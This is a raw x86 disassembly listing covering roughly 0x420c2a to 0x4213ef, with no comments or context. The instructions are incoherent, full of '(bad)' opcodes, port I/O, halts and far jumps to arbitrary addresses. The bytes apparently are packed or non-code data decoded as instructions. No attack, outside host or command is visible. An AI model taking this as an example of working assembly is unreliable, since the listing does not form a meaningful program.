  420c2a:	inc    ebp
  420c2b:	mov    al,0x38
  420c2d:	inc    esp
  420c2e:	and    bl,al
  420c30:	stos   BYTE PTR es:[edi],al
  420c31:	jno    0x420c86
  420c33:	add    dh,BYTE PTR [edi+ebx*1+0x6e1f5f51]
  420c3a:	dec    esi
  420c3b:	pop    eax
  420c3c:	imul   ebp,DWORD PTR [eax+edi*4],0xa4e8ff5e
  420c43:	mov    ah,0xaa
  420c45:	sti    
  420c46:	push   ds
  420c47:	pop    edi
  420c48:	ficomp WORD PTR [edi]
  420c4a:	ins    DWORD PTR es:[edi],dx
  420c4b:	stos   BYTE PTR es:[edi],al
  420c4c:	mov    eax,ds:0x25d29c
  420c51:	shr    BYTE PTR [ebx+0x17e8ecd5],1
  420c57:	repz mov ch,bl
  420c5a:	lock aaa 
  420c5c:	sar    BYTE PTR [eax],1
  420c5e:	ins    BYTE PTR es:[edi],dx
  420c5f:	push   ebp
  420c60:	out    0x83,al
  420c62:	std    
  420c63:	jns    0x420c65
  420c65:	frstor [ebx+eax*2-0x4778a43]
  420c6c:	cmp    al,0xdc
  420c6e:	jmp    0x420c8d
  420c70:	xor    ecx,edx
  420c72:	ret    
  420c73:	xchg   ebp,eax
  420c74:	hlt    
  420c75:	daa    
  420c76:	ret    
  420c77:	(bad)  
  420c78:	js     0x420ca8
  420c7a:	and    al,0xb7
  420c7c:	xor    eax,0xb05f4a29
  420c81:	cmp    BYTE PTR [eax+0x7e],dl
  420c84:	in     eax,0x4a
  420c86:	in     al,dx
  420c87:	bound  esp,QWORD PTR [edi]
  420c89:	les    edi,FWORD PTR [ecx+0x6f]
  420c8c:	mov    edi,0x73931399
  420c91:	outs   dx,DWORD PTR ds:[esi]
  420c92:	les    edi,FWORD PTR [edi-0x7e46db59]
  420c98:	inc    edx
  420c99:	(bad)  
  420c9a:	fsubr  DWORD PTR [ebp+ecx*8-0x79]
  420c9e:	mov    dh,0xe6
  420ca0:	dec    ebp
  420ca1:	mov    edi,0x82bf29f2
  420ca6:	jb     0x420ca6
  420ca8:	pop    esi
  420ca9:	cmp    eax,0x29f15bbe
  420cae:	and    DWORD PTR [ecx+0x3f],ebx
  420cb1:	dec    esp
  420cb2:	and    al,0x58
  420cb4:	jmp    0x420d0f
  420cb6:	pop    eax
  420cb7:	scas   eax,DWORD PTR es:[edi]
  420cb8:	xor    BYTE PTR [ecx-0x569d9667],dl
  420cbe:	add    edi,esi
  420cc0:	(bad)  
  420cc1:	cmc    
  420cc2:	fldcw  WORD PTR [eax+0x2d73fe85]
  420cc8:	dec    ecx
  420cc9:	add    ebx,0x2a83ae8f
  420ccf:	das    
  420cd0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420cd1:	mov    DWORD PTR [edx+0x24],esp
  420cd4:	xchg   ecx,eax
  420cd5:	xchg   esp,eax
  420cd6:	inc    ebp
  420cd7:	push   ecx
  420cd8:	imul   ecx,DWORD PTR [ecx+0x7dde35eb],0x88d279a2
  420ce2:	bound  ebx,QWORD PTR [ebx+0x4a0f213e]
  420ce8:	fld    TBYTE PTR [edx+0x4e4b172f]
  420cee:	push   ss
  420cef:	mov    cl,BYTE PTR [ecx+0x3f9df5fe]
  420cf5:	or     ch,BYTE PTR [eax+0x30]
  420cf8:	dec    ebp
  420cf9:	dec    esi
  420cfa:	call   DWORD PTR [ebp-0x4]
  420cfd:	pop    eax
  420cfe:	mov    BYTE PTR [esi],ch
  420d00:	loop   0x420ce9
  420d02:	ins    DWORD PTR es:[edi],dx
  420d03:	jmp    0x420d3a
  420d05:	ret    
  420d06:	call   0x2532e19d
  420d0b:	xchg   edi,eax
  420d0c:	cdq    
  420d0d:	dec    ecx
  420d0e:	adc    BYTE PTR [edi],bh
  420d10:	(bad)  
  420d11:	scas   al,BYTE PTR es:[edi]
  420d12:	cmp    eax,0x366e7a9e
  420d17:	mov    eax,0x68ea998e
  420d1c:	mov    ds:0x3399cc10,al
  420d21:	jmp    0x420d41
  420d23:	mov    al,ds:0x72cdaf9a
  420d28:	push   0xffffff9c
  420d2a:	xchg   esi,eax
  420d2b:	xlat   BYTE PTR ds:[ebx]
  420d2c:	fist   WORD PTR [ecx-0x29]
  420d2f:	adc    BYTE PTR [edi-0x72a5c451],bh
  420d35:	pop    eax
  420d36:	rcl    BYTE PTR [ecx-0x61],1
  420d39:	ficomp WORD PTR [edi-0x40aa394c]
  420d3f:	les    edi,FWORD PTR [edi]
  420d41:	adc    DWORD PTR [edx+esi*1],ecx
  420d44:	test   DWORD PTR [ebx],edx
  420d46:	daa    
  420d47:	jmp    0x7dbd3c5a
  420d4c:	push   cs
  420d4d:	ja     0x420d6d
  420d4f:	ret    0x5180
  420d52:	mov    WORD PTR [esp+esi*1],fs
  420d55:	add    DWORD PTR [edx+edi*8+0x195e40b],0x581d0829
  420d60:	mov    ecx,ebp
  420d62:	inc    ebp
  420d63:	xor    BYTE PTR [eax],ch
  420d65:	out    dx,eax
  420d66:	mov    BYTE PTR [esi+0x5b],al
  420d69:	mov    cl,0x5b
  420d6b:	cmc    
  420d6c:	push   esp
  420d6d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420d6e:	fistp  WORD PTR [eax]
  420d70:	or     eax,0x4bc1f27
  420d75:	xchg   esi,eax
  420d76:	mov    ch,0x2e
  420d78:	xchg   esp,eax
  420d79:	add    al,0xbf
  420d7b:	shl    BYTE PTR [edi-0x24508891],1
  420d81:	repnz push eax
  420d83:	shl    ah,1
  420d85:	dec    ecx
  420d86:	xchg   ebx,eax
  420d87:	sub    eax,0xa9ef4ee8
  420d8c:	push   ebx
  420d8d:	pop    es
  420d8e:	xchg   ebp,eax
  420d8f:	hlt    
  420d90:	jbe    0x420da2
  420d92:	mov    dh,0xc2
  420d94:	sub    esi,DWORD PTR ds:0xf14fd443
  420d9a:	ret    
  420d9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420d9c:	pop    edi
  420d9d:	pop    edx
  420d9e:	fist   DWORD PTR [esi]
  420da0:	xchg   DWORD PTR [eax-0x2ae73925],ebp
  420da6:	jmp    0xdfb8:0x16f65b3
  420dad:	fadd   st(2),st
  420daf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420db0:	inc    edx
  420db1:	cmp    ecx,edi
  420db3:	dec    bp
  420db5:	jne    0x420e36
  420db7:	xor    edi,DWORD PTR [ebx+0x3d702673]
  420dbd:	(bad)  [ecx]
  420dbf:	push   esp
  420dc0:	push   eax
  420dc1:	and    esi,esp
  420dc3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420dc4:	pop    ebx
  420dc5:	cs ins DWORD PTR es:[edi],dx
  420dc7:	jle    0x420dcb
  420dc9:	dec    esi
  420dca:	sub    ebx,DWORD PTR [eax+0x5025a0bb]
  420dd0:	pop    edx
  420dd1:	add    al,0xb3
  420dd3:	add    eax,DWORD PTR [edx+0x2a134a80]
  420dd9:	pop    esi
  420dda:	mov    edx,0x76f136ea
  420ddf:	lds    ebp,FWORD PTR [ecx+0x48532f5]
  420de5:	daa    
  420de6:	jmp    0x420df4
  420de8:	adc    DWORD PTR [esi-0x71],edx
  420deb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420dec:	(bad)  
  420ded:	jmp    0x8b3ce277
  420df2:	ss pusha 
  420df4:	(bad)  
  420df5:	mov    eax,ds:0xc1c5d3bc
  420dfa:	push   ebx
  420dfb:	mov    ah,0x82
  420dfd:	inc    esp
  420dfe:	xor    DWORD PTR [ebp-0x1139fe72],esp
  420e04:	ins    BYTE PTR es:[edi],dx
  420e05:	lods   eax,DWORD PTR ds:[esi]
  420e06:	dec    eax
  420e07:	out    0x28,eax
  420e09:	pop    ss
  420e0a:	ss lock push esp
  420e0d:	clc    
  420e0e:	fld    TBYTE PTR [eax+ebx*8-0x66]
  420e12:	inc    esp
  420e13:	imul   ecx,DWORD PTR [esi-0x2de786a3],0x7b
  420e1a:	mov    dl,0x63
  420e1c:	ficom  DWORD PTR [ebx-0x461171b4]
  420e22:	repnz in al,dx
  420e24:	sbb    esi,eax
  420e26:	out    dx,eax
  420e27:	add    cl,al
  420e29:	cdq    
  420e2a:	call   0xee2b:0x659aef8d
  420e31:	das    
  420e32:	enter  0xa5cb,0xc7
  420e36:	mov    BYTE PTR es:[ebx+ecx*4-0x5c2f497d],ch
  420e3e:	xor    eax,0xdf932f0f
  420e43:	dec    edx
  420e44:	and    eax,0x448e5ff
  420e49:	jge    0x420e99
  420e4b:	cmp    al,0xe7
  420e4e:	es push ecx
  420e50:	ror    BYTE PTR [ebx+eiz*8],1
  420e53:	push   edi
  420e54:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420e55:	dec    ebx
  420e56:	les    ecx,FWORD PTR [ebx*2+0x6a8d747e]
  420e5d:	fs jae 0x420e62
  420e60:	push   ss
  420e61:	xlat   BYTE PTR ds:[ebx]
  420e62:	jmp    0x9bef:0x6984
  420e68:	xchg   ecx,eax
  420e69:	pop    eax
  420e6a:	jns    0x420e83
  420e6c:	in     eax,dx
  420e6d:	inc    edi
  420e6e:	mov    edi,0xa642e0c
  420e73:	mov    BYTE PTR [ecx+ebp*1+0x6c],ah
  420e77:	mov    WORD PTR [edx+0x4f],gs
  420e7a:	shl    al,0x13
  420e7d:	addr16 pop ecx
  420e7f:	in     eax,dx
  420e80:	mov    edi,DWORD PTR [edi+0x40]
  420e83:	mov    eax,0x7f1e25e9
  420e88:	rcl    DWORD PTR [eax+ecx*4+0x6a1bec3],cl
  420e8f:	pop    esi
  420e90:	mov    bh,0x3
  420e92:	pop    es
  420e93:	dec    ecx
  420e94:	cmp    al,0x91
  420e96:	xor    eax,0x4bc94383
  420e9b:	mov    edi,0x9f1d5268
  420ea0:	sub    al,0x14
  420ea2:	push   ebp
  420ea3:	lods   eax,DWORD PTR ds:[esi]
  420ea4:	cdq    
  420ea5:	fisub  DWORD PTR [edx+0x18ffebcb]
  420eab:	push   ecx
  420eac:	aam    0x5c
  420eae:	xlat   BYTE PTR ds:[ebx]
  420eaf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420eb0:	push   ebx
  420eb1:	cli    
  420eb2:	ds mov ah,0xb7
  420eb5:	xchg   esi,eax
  420eb6:	hlt    
  420eb7:	outs   dx,DWORD PTR ds:[esi]
  420eb8:	inc    edi
  420eb9:	scas   al,BYTE PTR es:[edi]
  420eba:	addr16 pop ss
  420ebc:	inc    esi
  420ebd:	xchg   BYTE PTR [ebx-0x712ded54],dh
  420ec3:	scas   al,BYTE PTR es:[edi]
  420ec4:	sbb    eax,0xc9bc56cb
  420ec9:	fadd   QWORD PTR [esi-0x2a]
  420ecc:	pusha  
  420ecd:	mov    ebp,0xc45841cf
  420ed2:	addr16 inc esp
  420ed4:	pusha  
  420ed5:	test   DWORD PTR [ebp+0x4bcdf23a],ebp
  420edb:	repz xchg edi,eax
  420edd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420ede:	repz daa 
  420ee0:	mov    ecx,0xbca8d67
  420ee5:	retf   
  420ee6:	xchg   cl,ch
  420ee8:	repnz addr16 aam 0xf
  420eec:	add    al,0x68
  420eee:	inc    esp
  420eef:	xchg   esp,eax
  420ef0:	aam    0x68
  420ef2:	test   BYTE PTR [ebx-0x72],cl
  420ef5:	cmp    BYTE PTR [edi+0xb],cl
  420ef8:	mov    dl,0x6a
  420efa:	out    0xa,al
  420efc:	xchg   ebx,eax
  420efd:	fldcw  WORD PTR [eax+eax*8]
  420f00:	cdq    
  420f01:	and    DWORD PTR [eax-0x74],ebx
  420f04:	mov    dl,dl
  420f06:	daa    
  420f07:	mov    ss,WORD PTR [eax+ebx*8]
  420f0a:	cmp    al,0x4f
  420f0c:	dec    ebp
  420f0d:	retf   0xb9cc
  420f10:	push   esi
  420f11:	(bad)  
  420f12:	mov    eax,ds:0xa3100800
  420f17:	xor    bh,ch
  420f19:	or     edi,DWORD PTR [edx-0x6b]
  420f1c:	pop    ebx
  420f1d:	lods   eax,DWORD PTR ds:[esi]
  420f1e:	rol    ah,1
  420f20:	mov    al,0x40
  420f22:	(bad)  
  420f23:	pop    esi
  420f24:	or     edi,DWORD PTR [edi-0xfb1a581]
  420f2a:	mov    cl,BYTE PTR [ebp-0x642e3627]
  420f30:	int    0x9b
  420f32:	mov    eax,0x62469714
  420f37:	mov    edi,0x5e0122f0
  420f3c:	ffree  st(0)
  420f3e:	add    al,cl
  420f40:	and    BYTE PTR [ebx+eiz*1-0x58c0eff1],cl
  420f47:	jmp    0x420f6d
  420f49:	je     0x420f13
  420f4b:	jae    0x420f4a
  420f4d:	out    dx,al
  420f4e:	push   ebp
  420f4f:	in     eax,0xe2
  420f51:	mov    eax,ds:0x156c02d0
  420f56:	push   cs
  420f57:	outs   dx,DWORD PTR ds:[esi]
  420f58:	dec    ecx
  420f59:	faddp  st(7),st
  420f5b:	mov    eax,ds:0xbfb00a5d
  420f60:	les    edi,FWORD PTR [edx+0x7f46dc7b]
  420f66:	mov    edx,0xfe98d18c
  420f6b:	(bad)  
  420f6c:	outs   dx,BYTE PTR ds:[esi]
  420f6d:	cmp    BYTE PTR [edi],dl
  420f6f:	mov    ah,0x27
  420f71:	jge    0x420ef5
  420f73:	in     al,0x2d
  420f75:	mov    al,0x2d
  420f77:	(bad)  
  420f78:	mov    eax,ds:0x9aa530ee
  420f7d:	push   ebp
  420f7e:	adc    BYTE PTR [edi-0x42bbf417],ch
  420f84:	and    al,bl
  420f86:	cmp    al,0xc8
  420f88:	lds    ecx,FWORD PTR [edx+ebp*4+0x669906fb]
  420f8f:	daa    
  420f90:	fdiv   DWORD PTR [esi]
  420f92:	mov    al,ds:0x262f4556
  420f97:	inc    edi
  420f98:	lods   al,BYTE PTR ds:[esi]
  420f99:	int    0x40
  420f9b:	or     al,0x92
  420f9d:	mov    bl,0x1c
  420f9f:	push   cs
  420fa0:	pushf  
  420fa1:	adc    ebp,DWORD PTR ds:0xb34a4d9e
  420fa7:	mov    ah,0x37
  420fa9:	les    ecx,FWORD PTR [esi]
  420fab:	sub    BYTE PTR [esi],0x3
  420fae:	xor    DWORD PTR ds:0x11d4a99d,0x26
  420fb5:	rcr    BYTE PTR [eax],0xb5
  420fb8:	jne    0x420fe5
  420fba:	repz jno 0x420ff5
  420fbd:	int    0xb5
  420fbf:	and    esi,DWORD PTR [ebp-0x1a]
  420fc2:	ror    ah,0xb0
  420fc5:	mov    eax,ds:0xc015dfd8
  420fca:	and    al,0x1f
  420fcc:	adc    DWORD PTR [edx+0x622d99b8],ebp
  420fd2:	push   edi
  420fd3:	lods   al,BYTE PTR ds:[esi]
  420fd4:	aam    0x56
  420fd6:	sti    
  420fd7:	imul   esp,ebp,0x7e
  420fda:	fcmovnb st,st(7)
  420fdc:	sbb    eax,0xff690fc
  420fe1:	pop    ss
  420fe2:	pop    edx
  420fe3:	adc    cl,BYTE PTR [edi-0x4c]
  420fe6:	cli    
  420fe7:	sbb    DWORD PTR [edi+0x789d484f],ebp
  420fed:	out    0xf0,al
  420fef:	mov    bh,0xf3
  420ff1:	pop    edx
  420ff2:	shl    DWORD PTR [ecx],cl
  420ff4:	fnstsw WORD PTR ds:0x2e3fa9db
  420ffa:	jmp    DWORD PTR [ecx+0x2a46ec89]
  421000:	and    al,0xc5
  421002:	sub    al,0x1
  421004:	dec    ecx
  421005:	mov    edx,0xac7f50af
  42100a:	pop    ecx
  42100b:	xchg   edx,eax
  42100c:	jecxz  0x42103e
  42100e:	xor    cl,al
  421010:	int3   
  421011:	xor    BYTE PTR [edi],0x6b
  421014:	das    
  421015:	test   al,0xf0
  421017:	cmp    BYTE PTR ds:0x10ad8fa8,ah
  42101d:	add    al,0x37
  421020:	ffree  st(6)
  421022:	xor    al,0x35
  421024:	fcompp 
  421026:	shr    DWORD PTR [ecx],1
  421028:	and    al,0x59
  42102a:	pop    es
  42102b:	mov    edx,0x42db8d19
  421030:	mov    edi,DWORD PTR [edi+0x71]
  421033:	cmp    al,al
  421035:	sub    ecx,esi
  421037:	ret    
  421038:	outs   dx,DWORD PTR ds:[esi]
  421039:	inc    esi
  42103a:	cwde   
  42103b:	cwde   
  42103c:	jnp    0x421056
  42103e:	pop    esi
  42103f:	fld1   
  421041:	mov    esp,0x5e7faa37
  421046:	pop    esi
  421047:	mov    edi,0x13f0238d
  42104c:	cwde   
  42104d:	pop    eax
  42104e:	pop    ebx
  42104f:	push   ebp
  421050:	or     eax,0x731ddc2
  421055:	outs   dx,BYTE PTR ds:[esi]
  421056:	add    eax,0x92d713f5
  42105b:	fs es dec ecx
  42105e:	bound  esi,QWORD PTR [edx-0x3f6a064f]
  421064:	popa   
  421065:	cdq    
  421066:	pushf  
  421067:	sub    al,0xad
  421069:	sub    esp,DWORD PTR [esi+ebp*1+0x1d6e9b5a]
  421070:	jecxz  0x4210b5
  421072:	jmp    0x4210bb
  421074:	pop    esi
  421075:	into   
  421076:	mov    ss,esi
  421078:	das    
  421079:	mov    esi,0x94bd33c2
  42107e:	pop    esp
  42107f:	push   esp
  421080:	xor    eax,0x6345ac97
  421085:	loope  0x421090
  421087:	je     0x4210fb
  421089:	imul   ebp,DWORD PTR [edx+ecx*8],0xffffffb3
  42108d:	and    al,BYTE PTR [ebx+ebx*2]
  421090:	jmp    0x4210e1
  421092:	adc    al,0x28
  421094:	adc    dh,cl
  421096:	popf   
  421097:	ret    
  421098:	aad    0xfe
  42109a:	or     eax,0xab75331a
  42109f:	(bad)  
  4210a0:	sub    edi,DWORD PTR ds:0x8e621571
  4210a6:	jl     0x421053
  4210a8:	pop    ds
  4210a9:	lods   al,BYTE PTR ds:[esi]
  4210aa:	sahf   
  4210ab:	xchg   ebx,eax
  4210ac:	mov    bl,0x6d
  4210ae:	xchg   DWORD PTR [edx+eiz*2+0x56],ebx
  4210b2:	sub    eax,0x42e98490
  4210b7:	dec    ecx
  4210b8:	jb     0x4210a8
  4210ba:	inc    ebx
  4210bb:	mov    al,ds:0xcf6efb86
  4210c0:	fdiv   DWORD PTR [edi-0x13]
  4210c3:	dec    eax
  4210c4:	or     al,0xd4
  4210c7:	xchg   ebp,eax
  4210c8:	mov    edx,0x3a54dc95
  4210cd:	sub    eax,0x67280933
  4210d2:	sub    eax,0x3faec5f7
  4210d8:	rdpmc  
  4210da:	sub    DWORD PTR [esi-0x1e710596],ebp
  4210e0:	inc    ebp
  4210e1:	mov    di,0x81b1
  4210e5:	mov    ebx,0xbe45ffac
  4210ea:	cdq    
  4210eb:	imul   edx,DWORD PTR [eax-0x4f6b8706],0xffffffef
  4210f2:	(bad)  
  4210f3:	and    ah,dl
  4210f5:	aaa    
  4210f6:	jbe    0x421110
  4210f8:	fcomp  QWORD PTR [edi+0x3d]
  4210fb:	push   0xfbb8385c
  421100:	or     DWORD PTR [ecx],esi
  421102:	loopne 0x421151
  421104:	loop   0x42114a
  421106:	fwait
  421107:	add    esi,eax
  421109:	or     ebp,DWORD PTR [edx]
  42110b:	mov    esp,0xf4eb6b52
  421110:	shr    DWORD PTR [ebp+0x51],0x64
  421114:	cli    
  421115:	xor    ch,bh
  421117:	mov    WORD PTR ds:0x7f426223,ss
  42111d:	and    al,0x75
  42111f:	push   esp
  421120:	xor    ch,BYTE PTR [bp+di]
  421123:	aas    
  421124:	outs   dx,DWORD PTR ds:[esi]
  421125:	aas    
  421126:	mov    al,0xad
  421128:	pop    es
  421129:	jmp    0x3704dce2
  42112e:	(bad)  
  42112f:	fdiv   DWORD PTR [ebx-0x29442a74]
  421135:	or     DWORD PTR [eax],0x1a
  421138:	imul   ebx,ebp,0xffffff8d
  42113b:	in     al,0xed
  42113d:	(bad)  
  42113e:	lods   al,BYTE PTR ds:[esi]
  42113f:	pushf  
  421140:	mov    WORD PTR [edi+edx*8],?
  421143:	sbb    BYTE PTR [ebx+esi*2-0x45],dl
  421147:	adc    cl,dl
  421149:	pop    eax
  42114a:	fwait
  42114b:	int    0x73
  42114d:	popa   
  42114e:	les    eax,FWORD PTR [edi]
  421150:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421151:	hlt    
  421152:	test   al,0x2d
  421154:	call   0x2dde2768
  421159:	jbe    0x42116f
  42115b:	pop    ecx
  42115c:	cmp    dl,BYTE PTR [ebp+edx*4-0xa787ef0]
  421163:	clc    
  421164:	jmp    0x987b:0xeaed4198
  42116b:	(bad)  
  42116c:	iret   
  42116d:	xchg   ecx,eax
  42116e:	adc    eax,0xc915916a
  421173:	test   al,0xf8
  421175:	sub    esi,DWORD PTR [ecx]
  421177:	and    esi,DWORD PTR [ebp+0x82c21aa]
  42117d:	add    BYTE PTR [ebp+0x61],cl
  421180:	mov    bh,0xe5
  421182:	in     al,0x13
  421184:	fcmove st,st(6)
  421186:	cli    
  421187:	jbe    0x4211f8
  421189:	mov    ds:0xa4cd29a5,al
  42118e:	xor    bh,ch
  421190:	inc    esp
  421191:	fwait
  421192:	mov    ss,eax
  421194:	aam    0x86
  421196:	lods   eax,DWORD PTR ds:[si]
  421198:	hlt    
  421199:	push   ss
  42119a:	pop    ds
  42119b:	xor    al,0x29
  42119d:	jmp    0x13de919a
  4211a2:	fimul  DWORD PTR [edx+0x1f606eab]
  4211a8:	jg     0x421153
  4211aa:	fnstcw WORD PTR [esi+0x48db7afb]
  4211b0:	jne    0x421192
  4211b2:	push   es
  4211b3:	push   0xa790292a
  4211b8:	mov    dl,0x42
  4211ba:	cmp    esp,ecx
  4211bc:	aas    
  4211bd:	and    eax,0xd4fd0a9d
  4211c2:	ret    0x989f
  4211c5:	iret   
  4211c6:	add    al,0x45
  4211c8:	xchg   ecx,eax
  4211c9:	mov    cl,0x64
  4211cb:	iret   
  4211cc:	lods   eax,DWORD PTR ds:[esi]
  4211cd:	or     bh,BYTE PTR [edi+esi*2+0x2a]
  4211d1:	or     eax,0x784b7bf1
  4211d6:	jmp    0x3247c405
  4211db:	(bad)  
  4211dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4211dd:	retf   
  4211de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4211df:	cs fdivr st(6),st
  4211e2:	in     eax,dx
  4211e3:	pop    esp
  4211e4:	test   DWORD PTR [eax],esp
  4211e6:	scas   al,BYTE PTR es:[di]
  4211e8:	and    dh,BYTE PTR [eax]
  4211ea:	sub    eax,0x5fbde360
  4211ef:	popf   
  4211f0:	sub    BYTE PTR ds:0xafb00917,ch
  4211f6:	repz dec ebp
  4211f8:	rol    BYTE PTR ss:[edi*1+0x6e430e8a],1
  421200:	cwde   
  421201:	push   0xcc81e86d
  421206:	xchg   edx,eax
  421207:	push   ds
  421208:	mov    bl,0xbb
  42120a:	jae    0x421225
  42120c:	pop    ebp
  42120d:	jae    0x4211d0
  42120f:	ja     0x42126e
  421211:	pop    edi
  421212:	sub    DWORD PTR [ecx-0x4c],0xffffffd3
  421216:	dec    ecx
  421217:	shl    DWORD PTR [edi+0x7f5f6b37],cl
  42121d:	jmp    0x421200
  42121f:	push   edi
  421220:	sbb    DWORD PTR [ebp+0xd],edi
  421223:	(bad)  
  421224:	enter  0xdd14,0xd8
  421228:	cld    
  421229:	mov    ah,0x24
  42122b:	int    0xff
  42122d:	dec    ebx
  42122e:	or     eax,0x823889d5
  421233:	cmp    DWORD PTR [eax],0x6da53262
  421239:	imul   esi,DWORD PTR [ebp-0x43038c33],0xdadaa462
  421243:	dec    ecx
  421244:	cli    
  421245:	shr    ebp,cl
  421247:	in     eax,0xe7
  421249:	add    BYTE PTR cs:[eax+esi*4],bh
  42124d:	stos   DWORD PTR es:[edi],eax
  42124e:	out    dx,eax
  42124f:	rcr    BYTE PTR [ebx],cl
  421251:	adc    esp,DWORD PTR ds:0xbda2e687
  421257:	mov    ebx,DWORD PTR [ebx]
  421259:	in     al,0x1e
  42125b:	sahf   
  42125c:	dec    ebp
  42125d:	fdiv   QWORD PTR [edx-0x6257caf9]
  421263:	push   ds
  421264:	sti    
  421265:	iret   
  421266:	pop    esp
  421267:	pop    eax
  421268:	jns    0x421231
  42126a:	cs push ecx
  42126c:	sub    eax,0x93386437
  421271:	test   eax,0x47b7dec2
  421276:	cli    
  421277:	icebp  
  421278:	inc    ecx
  421279:	xor    bh,BYTE PTR [edi-0x233b41a9]
  42127f:	pop    es
  421280:	dec    edx
  421281:	repz pop ecx
  421283:	fisub  WORD PTR [eax]
  421285:	stos   BYTE PTR es:[edi],al
  421286:	(bad)
  421289:	not    ecx
  42128b:	mov    ah,0x23
  42128d:	mov    al,0x3e
  42128f:	or     BYTE PTR [esi-0x3f],al
  421292:	(bad)  
  421294:	adc    eax,0xc1f71fb7
  421299:	dec    edi
  42129a:	sub    BYTE PTR [ebp+ebx*4+0x36f9a46a],dl
  4212a1:	arpl   di,sp
  4212a3:	pop    es
  4212a4:	xor    ebp,eax
  4212a6:	push   cs
  4212a7:	xor    al,0xf
  4212aa:	cwde   
  4212ab:	mul    DWORD PTR [ebx-0x62]
  4212ae:	sbb    dl,BYTE PTR [edx]
  4212b0:	add    BYTE PTR [eax],dl
  4212b2:	jb     0x42125d
  4212b4:	imul   ebx,DWORD PTR [esi+0x2ece4da9],0x6bac19f2
  4212be:	inc    edi
  4212bf:	imul   edi,DWORD PTR [ebp+0x1d],0xfffffff6
  4212c3:	pop    esi
  4212c4:	add    ecx,DWORD PTR [edx+ecx*4+0x2e]
  4212c8:	xor    al,0x81
  4212ca:	mov    dl,0x3a
  4212cc:	mov    BYTE PTR [esi+0x2f8707a4],bh
  4212d2:	sub    DWORD PTR [edi],edi
  4212d4:	inc    edi
  4212d5:	dec    DWORD PTR [edx]
  4212d7:	jo     0x42127c
  4212d9:	mov    ah,0xd4
  4212db:	sbb    DWORD PTR [esi],edi
  4212dd:	xor    edx,DWORD PTR [edx-0x8c3bbad]
  4212e3:	adc    eax,0xe7080c6d
  4212e8:	adc    ecx,DWORD PTR [ebx-0x9bccefc]
  4212ee:	cmc    
  4212ef:	fldcw  WORD PTR [esi+0x40]
  4212f2:	loopne 0x4212b7
  4212f4:	cmp    eax,0xf833f51c
  4212f9:	ret    0xb787
  4212fc:	xchg   esp,eax
  4212fd:	imul   esp,DWORD PTR [si-0x37],0xbc3e8bc4
  421305:	sub    eax,0xfa23b4b6
  42130a:	dec    ebp
  42130b:	adc    esp,DWORD PTR [edx+ecx*2+0x372704d2]
  421312:	aad    0x8a
  421314:	int    0xbf
  421316:	pop    ds
  421317:	mov    dh,0xa8
  421319:	pop    ebp
  42131a:	sbb    BYTE PTR [eax],dh
  42131c:	sbb    bl,BYTE PTR [ebp+0x10]
  42131f:	adc    al,0x91
  421321:	pushf  
  421322:	and    BYTE PTR ds:0xe0fc0719,0xd5
  421329:	adc    dh,cl
  42132b:	jge    0x4212f1
  42132d:	inc    edi
  42132e:	stos   BYTE PTR es:[edi],al
  42132f:	mov    bh,0xe7
  421331:	pop    ebx
  421332:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421333:	out    dx,al
  421334:	gs icebp 
  421336:	leave  
  421337:	sub    esp,DWORD PTR [ebx-0x64e72b1a]
  42133d:	dec    edi
  42133e:	or     DWORD PTR [esi],esi
  421340:	imul   edx,DWORD PTR [ebp+0x5234a46a],0x27
  421347:	loop   0x4212f6
  421349:	add    BYTE PTR [ebx-0x78e7a895],cl
  42134f:	repnz sbb esp,DWORD PTR fs:[ecx]
  421353:	imul   ebx,DWORD PTR [ecx-0x3e],0xffffffa0
  421357:	cdq    
  421358:	jo     0x4213a4
  42135a:	fucomip st,st(4)
  42135c:	xor    al,0xb9
  42135e:	mov    bh,0xea
  421360:	gs xchg esp,eax
  421362:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421363:	mov    cl,0xd0
  421365:	test   eax,0x3cff3791
  42136a:	pushf  
  42136b:	rcr    bl,1
  42136d:	cmc    
  42136e:	xchg   ebx,eax
  42136f:	shl    DWORD PTR [esi-0x72de91ae],0x3c
  421376:	popa   
  421377:	jae    0x42136d
  421379:	mov    ds:0xef371ed,al
  42137e:	out    0x52,eax
  421380:	lea    ecx,ds:0x6229e658
  421386:	rcl    DWORD PTR [eax],0xd
  421389:	repz mov dl,0xc9
  42138c:	addr16 (bad) 
  42138f:	xor    BYTE PTR [ecx-0x3164b486],0x8b
  421396:	cmp    dh,BYTE PTR [esp+ecx*8+0x54]
  42139a:	iret   
  42139b:	bound  esp,QWORD PTR [ebx+0x14e026fc]
  4213a1:	cmp    ah,BYTE PTR [edi+edx*1-0x2385ed15]
  4213a8:	or     BYTE PTR [eax],cl
  4213aa:	fwait
  4213ab:	mov    ecx,0xd0d32489
  4213b0:	scas   eax,DWORD PTR es:[edi]
  4213b1:	xchg   BYTE PTR [ecx-0x239a5b5f],ah
  4213b7:	push   ecx
  4213b8:	sub    DWORD PTR [ecx],edx
  4213ba:	call   0x4851:0x26a7ff46
  4213c1:	jae    0x4213ca
  4213c3:	cs pop esi
  4213c5:	iret   
  4213c6:	push   edx
  4213c7:	fdivr  st(1),st
  4213c9:	push   esi
  4213ca:	lods   eax,DWORD PTR ds:[esi]
  4213cb:	adc    DWORD PTR [esi],ebx
  4213cd:	mov    eax,DWORD PTR [edi+0x6925947e]
  4213d3:	dec    edx
  4213d4:	push   es
  4213d5:	shr    BYTE PTR ss:[esi],1
  4213d8:	inc    ecx
  4213d9:	call   0x6229:0xad2dd9c8
  4213e0:	in     eax,dx
  4213e1:	sub    BYTE PTR [esi+0x7c],dl
  4213e4:	stc    
  4213e5:	ret    
  4213e6:	push   es
  4213e7:	adc    cl,BYTE PTR [ecx]
  4213e9:	cs add ebp,edx
  4213ec:	ss xchg esp,ecx
  4213ef:	dec    esp
